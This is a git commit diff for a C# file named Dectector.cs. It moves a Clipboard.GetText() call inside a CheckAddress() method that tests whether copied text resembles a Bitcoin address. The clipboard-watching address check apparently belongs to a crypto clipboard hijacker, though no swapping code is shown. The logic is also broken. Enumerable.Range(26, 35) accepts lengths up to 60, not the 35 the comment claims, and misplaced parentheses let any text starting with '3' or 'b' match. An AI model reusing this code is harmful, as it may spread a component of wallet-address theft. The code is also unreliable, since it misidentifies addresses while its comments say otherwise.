0d1a7f4cfda9f991b5cd78a1e1998d0b2d526caa
destinybeholdsup <58670085+destinybeholdsup@users.noreply.github.com>
2024-04-14 18:21:28 -0400

    Update Dectector.cs

--- Dectector.cs
+++ Dectector.cs
@@ -1,10 +1,10 @@
 public bool CheckAddress()
 {
-    var clipText = Clipboard.GetText();
-
     // Checks if clipText length is 26-35 characters long.
     // If it is within that length, checks if it starts with either 1,3, or b.
     // Since each crypto address is extremely unique, these are all you need to properly identify most if not any btc address.
+
+    var clipText = Clipboard.GetText();
 
     if (Enumerable.Range(26, 35).Contains(clipText.Length) && 
         (clipText.StartsWith("1")) || (clipText.StartsWith("3")) || (clipText.ToLower().StartsWith("b")))
